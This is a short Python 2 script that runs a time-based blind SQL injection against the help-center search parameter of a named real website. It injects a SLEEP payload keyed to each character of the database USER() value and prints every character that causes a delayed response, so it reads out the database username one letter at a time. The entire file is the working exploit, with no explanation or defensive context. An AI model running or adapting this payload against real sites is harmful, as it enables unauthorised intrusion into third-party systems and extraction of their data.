#!/usr/bin/env python
# encoding: utf-8

import requests
import time
import sys

reload(sys)

sys.setdefaultencoding('utf-8')
payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

for i in range(1,20):
    for _str in payloads:
        start_time = time.time()
        url = "http://www.meilishuo.com/helpcenter/search/?title=hello';(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER())," + str(i) + ",1))=" + str(ord(_str)) + ")*5)))ring)%23"
        result = requests.get(url).text
        if(time.time() - start_time) > 3:
            print _str
